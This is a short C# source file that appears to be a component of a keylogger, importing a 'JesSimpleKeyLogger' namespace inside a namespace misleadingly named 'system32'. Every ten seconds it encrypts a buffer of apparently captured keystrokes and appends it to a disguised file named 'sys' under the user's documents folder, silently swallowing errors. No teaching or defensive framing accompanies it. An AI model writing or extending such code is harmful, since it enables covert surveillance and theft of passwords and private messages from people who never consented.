using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using JesSimpleKeyLogger;

namespace system32
{
    class write
    {
        public static string buf;
        public static void writestr()
        {
            System.Timers.Timer tm2 = new System.Timers.Timer();
            tm2.Interval = 10000;
            tm2.Enabled = true;
            tm2.Elapsed += new ElapsedEventHandler(timer2_Tick);
            tm2.Start();
            
        }

        private static void timer2_Tick(object sender, EventArgs e)
        {
            string path = @"c:\\Мои документы\ey\sys";
            buf = encryption.Encrypt(buf);
            try
            {
                StreamWriter sw = new StreamWriter(path, true, Encoding.GetEncoding(1251));
                sw.Write(buf + Environment.NewLine); // Пишем в файл ...
                sw.Close();
                buf = "";
            }
            catch (Exception e5)
            {

            }
        }
    }
}
